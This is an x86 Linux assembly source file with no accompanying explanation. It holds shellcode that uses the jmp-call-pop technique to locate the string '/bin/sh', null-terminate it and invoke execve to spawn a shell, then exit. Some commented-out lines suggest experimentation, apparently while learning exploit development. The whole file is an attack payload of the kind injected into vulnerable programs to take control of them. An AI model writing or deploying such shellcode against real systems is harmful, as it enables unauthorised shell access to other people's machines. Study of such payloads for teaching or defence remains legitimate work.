global _start

section .text

_start:
	jmp function


function2:
	pop esi

	xor eax, eax
	push eax
	;mov byte [esi + 7], al
	;mov dword [esi + 8], esi
	;mov dword [esi + 16], eax
	;mov dword [esi + 24], eax

	mov al, 11
	
	xor ebx, ebx
	mov ebx, esi
	xor ecx, ecx
	pop ecx
	mov [ebx + 7], ecx

	
	xor edx, edx
	int 0x80


	xor eax, eax
	mov al, 1
	int 0x80
	
	





function:
	call function2
	message: db "/bin/sh"
